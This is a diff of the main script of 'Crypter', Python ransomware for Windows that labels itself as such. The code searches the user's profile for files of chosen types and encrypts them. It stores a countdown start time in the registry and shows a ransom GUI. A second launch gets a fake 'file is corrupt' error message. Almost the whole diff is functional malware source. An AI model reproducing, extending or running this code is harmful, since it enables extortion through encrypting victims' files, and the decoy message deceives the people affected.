@@ -1,16 +1,8 @@
-## RANSOM
-## Main Script
-## author mls
-# todo Adjust dialogs to only allow one instance open at a time
-# todo Disable OK and Canel buttons on decryption AS SOON as OK is hit and decryption starts
-
 '''
-@done:
-- Adjusted decrypt files button to disable once the key has been destoryed
-- Adjusted view encrypted files button to load a default messages if the list file was not found
-- Successful decryption now also disables the OK button, prevent a re-decryption
-    + It also disables the "Enter Decryption Key" button on the Main Menu
-- Implemented method to delete the timer registry key foillowing successful decrpytin
+@summary: Crypter: Ransomware written entirely in python.
+@author: MLS
+@version: 1.6.5
+@todo: Adjust BuildConfig to be an included data file for runtime config 
 '''
 
 # Import libs
@@ -29,77 +21,86 @@ import Base
 import Gui
 
 
-################
-## Main Class ##
-################
-class Main(Base.Base):
-  # Class to create a main object for the program
+###################
+## CRYPTER Class ##
+###################
+class Crypter(Base.Base):
+  '''
+  @summary: Crypter: Controls interaction between relevant objects
+  @author: MLS
+  '''
   
-  # Class Variables
-  KEY_DESTRUCT_TIME_SECONDS = 259200
-  REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
-  REGISTRY_CONTEXT = _winreg.HKEY_CURRENT_USER
 
-
-  def __init__(self, action, decrypt_key):
-    # Init Object
+  def __init__(self):
+    '''
+    @summary: Constructor
+    '''
     self.encrypted_file_list = os.path.join(os.environ['APPDATA'], "encrypted_files.txt")
 
     # Init Crypt Lib
-    if decrypt_key and action == "decrypt":
-      self.Crypt = Crypt.SymmetricCrypto(decrypt_key)
-    else:
-      self.Crypt = Crypt.SymmetricCrypto()
+    self.Crypt = Crypt.SymmetricCrypto()
 
-    # handle action
-    if action == "encrypt" and not os.path.isfile(self.encrypted_file_list):
+    # FIRST RUN
+    # Encrypt!
+    if not os.path.isfile(self.encrypted_file_list):
       file_list = self.find_files()
       # Start encryption
       self.encrypt_files(file_list)
       # Present GUI
       self.start_gui()
-    # IF already encrypted
-    elif action == "encrypt" and os.path.isfile(self.encrypted_file_list):
+    # ALREADY ENCRYPTED
+    # Present menu
+    elif os.path.isfile(self.encrypted_file_list):
       self.start_gui()
-    elif action == "decrypt":
-      # Start decryption
-      self.decrypt_files()
       
       
   def get_start_time(self):
-    # Function to get the start time from the registry, or create a new entry for it
+    '''
+    @summary: Get's Crypter's start time from the registry, or creates it if it
+    doesn't exist
+    @return: The time that the ransomware began it's encryption operation, in integer epoch form 
+    '''
     
     # Try to open registry key
     try:
-      reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+      reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
       start_time = _winreg.QueryValueEx(reg, "")[0]
       _winreg.CloseKey(reg)
     # If failure, create the key
     except WindowsError:
       start_time = int(time.time())
-      reg = _winreg.CreateKey(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+      reg = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
       _winreg.SetValue(reg, "", _winreg.REG_SZ, str(start_time))
       _winreg.CloseKey(reg)
         
     return start_time    
 
+
   def cleanup(self):
-    # To be called once decryption has finished. Cleans up the system
+    '''
+    @summary: Cleanups the system following successful decryption. Removed the list of
+    encrypted files and deletes the Crypter registry key
+    '''
     
     self.delete_encrypted_file_list()
     self.delete_registry_entries()
 
+
   def delete_registry_entries(self):
-    # Function to delete the timer registry keyo
+    '''
+    @summary: Deletes the timer registry key
+    '''
     
     # Open and delete the key
-    reg = _winreg.OpenKeyEx(self.REGISTRY_CONTEXT, self.REGISTRY_LOCATION)
+    reg = _winreg.OpenKeyEx(_winreg.HKEY_CURRENT_USER, self.REGISTRY_LOCATION)
     _winreg.DeleteKeyEx(reg, "")
     _winreg.CloseKey(reg)
     
       
   def start_gui(self):
-    # Function to open to GUI
+    '''
+    @summary: Initialises and launches the ransomware GUI screen
+    '''
     
     # Get Crypter start_time
     start_time = self.get_start_time()
@@ -116,8 +117,12 @@ class Main(Base.Base):
     crypter_gui.Show()
     app.MainLoop()
     
+
   def get_encrypted_file_list(self):
-    # Function to return the list of encrypted files
+    '''
+    @summary: Returns a list of the files encrypted by crypter
+    @return: Encrypted file list
+    '''
 
     # Get list of encrypted files
     try:
@@ -129,12 +134,12 @@ class Main(Base.Base):
   
     return file_list
 
-      
 
   def decrypt_file(self, encrypted_file):
-    # Function to decrypt a file
-    # To be called and iterated via GUI
-    # TODO Once decrypted, delete the registry key entry
+    '''
+    @summary: Processes the list of encrypted files and decrypts each. Should be called once per file
+    @param encrypted_file: an encrypted file to decrypt
+    '''
 
     # Decrypt!
     if not encrypted_file:
@@ -147,14 +152,19 @@ class Main(Base.Base):
       
       
   def delete_encrypted_file_list(self):
-    # Function to delete the list of encrypted files
+    '''
+    @summary: Deletes the list of encrypted files
+    '''
 
     # Remove encrypted file list
     os.remove(self.encrypted_file_list)
 
 
   def encrypt_files(self, file_list):
-    # Function to encrypt the provided files
+    '''
+    @summary: Encrypts all files in the provided file list param
+    @param file_list: A list of files to encrypt
+    '''
     encrypted_files = []
 
     # Encrypt them and add to list if successful
@@ -185,7 +195,11 @@ class Main(Base.Base):
       
 
   def find_files(self):
-    # Function to find the relevant files to encrypt and return a list
+    '''
+    @summary: Searches the file system and builds a list of files to encrypt
+    @return: List of files matching the location and filetype criteria
+    '''
+
     base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
     file_list = []
 
@@ -207,7 +221,11 @@ class Main(Base.Base):
 
 
   def is_valid_filetype(self, file):
-    # Function to validate that the file extension is valid
+    '''
+    @summary: Verifies whether the specified file is of an acceptable type for encryption
+    @param file: The file to check
+    @attention: The list of filetypes to encrypt is defined in the Base.Base class
+    '''
 
     # Split filename
     components = file.split(".")
@@ -218,15 +236,19 @@ class Main(Base.Base):
 
     # Get extension and check if valid
     extension = components[-1]
-    if extension in self.FILETYPES:
+    if extension.lower() in self.FILETYPES:
       return True
     else:
       return False
 
 
   def set_wallpaper(self):
-    # Function to set the ransom wallpaper
-    # FUNCTION NOW OBSOLETE: No longer chaning desktop wallpaper
+    '''
+    @summary: Sets the users wallpaper to a specific ransom not image
+    @attention: FUNCTION NOW OBSOLETE. This method, and approach, is no longer used. The ransom
+    note is now displayed via a WX GUI
+    @requires: To enable this method, add an import for ctypes
+    '''
 
     # Import image and write to path
     # todo adjust file name... maybe replace this with whatever is provided in the config file?
@@ -238,46 +260,20 @@ class Main(Base.Base):
 
 if __name__ == "__main__":
 
-  # Parse any arguments
-  args_list = sys.argv
-  # Check for decrypt
-  for x in args_list:
-    if x == "-d" or x == "--decrypt":
-      action = "decrypt"
-      break
-    else:
-      action = "encrypt"
-
-  # Check for key
-  for x in range(len(args_list)):
-    if (args_list[x] == "-k" or args_list[x] == "--key") and (action == "decrypt"):
-      try:
-        if len(args_list[x+1]) == 32:
-          key = args_list[x+1]
-          break
-        else:
-          key = None
-          break
-      except IndexError:
-        key = None
-        break
-    else:
-      # Exit if decrypting and key has not been provided
-      key = None
-
-  # START
-  if action == "decrypt" and key is None:
-    sys.exit()
-  else:
-
-    # Now try to create mutex
+    ## START
+    # Try to grab mutex control
     mutex = win32event.CreateMutex(None, 1, "mutex_rr_windows")
     if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+      # If mutex already exists, present corruption message
       mutex = None
+      app = wx.App()
+      error_dialog = wx.MessageDialog(None, "The file is corrupt and cannot be opened",
+                                      "Error", wx.OK|wx.ICON_ERROR)
+      error_dialog.ShowModal()
+      app.MainLoop()
       sys.exit()
 
-    # Otherwise run
+    # Otherwise run crypter
     else:
-      ransom = Main(action, key)
-      # Delete the mutex
+      go = Crypter()
 
